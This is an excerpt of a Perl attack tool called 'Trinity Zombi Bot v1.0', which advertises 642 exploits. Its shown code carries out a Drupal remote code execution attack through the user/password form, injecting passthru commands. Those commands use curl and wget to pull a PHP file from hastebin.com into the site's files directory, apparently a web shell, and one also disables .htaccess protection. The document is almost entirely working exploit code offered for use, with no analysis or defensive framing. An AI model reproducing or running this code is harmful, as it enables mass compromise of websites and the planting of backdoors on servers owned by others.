...
system ("title Trinity Zombi Bot v1.0");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); } 
 $hexhrabchedched = "

           Zombi Bot v1.0 Trinity
 [+] - 642 Exploit (Mixed)
...
################ Check Update #####################
print color("bold yellow"),"[1] Trinity Private Exploit Attacker \n";
print color("yellow"), "\n";
print color 'reset';
print color("bold yellow"),"[2] Trinity Email Tester \n";
print color("yellow"), "\n";
print color 'reset';
...
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl https://hastebin.com/raw/emonopetey | wget https://hastebin.com/raw/emonopetey.php";
...
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=curl+-o+data-log.php+https://hastebin.com/raw/emonopetey.php";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
...
my $addblockurl = "$site/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=mv+Result/default/files/.htaccess+htaccessx;curl+-o+Result/default/files/data-log.php+'https://hastebin.com/raw/emonopetey.php'";
my $ajax = "_triggering_element_name";
my $response = $ua->post($addblockurl, Content-Type => 'application/json', Content => ['form_id' => 'user_pass', $ajax => 'name']);
my $body = $response->content;
my $regex='<input type="hidden" name="form_build_id" value="(.*?)" />';
...
my $wget = "wget https://hastebin.com/raw/emonopetey.php";
...
my $wget = "wget%20https://hastebin.com/raw/emonopetey.php";
